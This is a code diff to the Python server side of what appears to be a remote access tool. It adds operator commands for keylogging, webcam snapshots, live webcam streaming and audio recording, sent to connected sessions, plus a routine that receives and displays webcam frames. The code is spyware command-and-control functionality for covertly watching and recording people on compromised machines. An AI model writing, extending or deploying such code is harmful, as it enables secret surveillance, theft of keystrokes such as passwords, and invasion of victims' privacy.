@@ -155,6 +155,29 @@ class TLSServer:
 
             elif cmd == "screenshot":
                 self._send_to_current(cmd.encode("utf-8"))
+                
+            elif cmd.startswith("keylogger "):
+                try:
+                    int(cmd.split()[1])
+                    self._send_to_current(cmd.encode("utf-8"))
+                except (ValueError, IndexError):
+                    logger.debug("Usage: keylogger <duration_seconds>")
+            elif cmd == "webcam_snapshot":
+                self._send_to_current(cmd.encode("utf-8"))
+
+            elif cmd.startswith("webcam_stream "):
+                try:
+                    int(cmd.split()[1])
+                    self._send_to_current(cmd.encode("utf-8"))
+                except (ValueError, IndexError):
+                    logger.debug("Usage: webcam_stream <duration_seconds>")
+
+            elif cmd.startswith("record_audio "):
+                try:
+                    int(cmd.split()[1])
+                    self._send_to_current(cmd.encode("utf-8"))
+                except (ValueError, IndexError):
+                    logger.debug("Usage: record_audio <duration_seconds>")
 
             elif cmd == "exit":
                 logger.debug("Exiting admin console")
@@ -255,9 +278,42 @@ class TLSServer:
         if operation.startswith('SEND_FILE '):
             filename = operation.split()[1]
             self._recv_file(filename)
-        if operation == "DISPLAY":
+        elif operation_str == "DISPLAY":
             logger.debug("[*] Server displaying")
             self._recv_output()
+        elif operation_str == "FRAME":
+            self._recv_frame()
+        elif operation_str == "STREAM_END":
+            logger.debug("[*] Webcam stream ended")
+            
+    def _recv_frame(self):
+        """Reçoit et affiche une frame JPEG du stream webcam."""
+        try:
+            import cv2
+            import numpy as np
+
+            with self.lock:
+                sid = self.current_session
+                sock = self.sessions.get(sid)
+
+            size_line = readline(sock).decode("ascii").strip()
+            size = int(size_line)
+
+            data = b""
+            while len(data) < size:
+                chunk = sock.recv(min(4096, size - len(data)))
+                if not chunk:
+                    break
+                data += chunk
+
+            frame = cv2.imdecode(
+                np.frombuffer(data, dtype=np.uint8), cv2.IMREAD_COLOR
+            )
+            if frame is not None:
+                cv2.imshow("Webcam Stream", frame)
+                cv2.waitKey(1)
+        except Exception as e:
+            logger.debug("[server] Frame recv error: %s", e)
 
     def stop(self):
         self.running = False
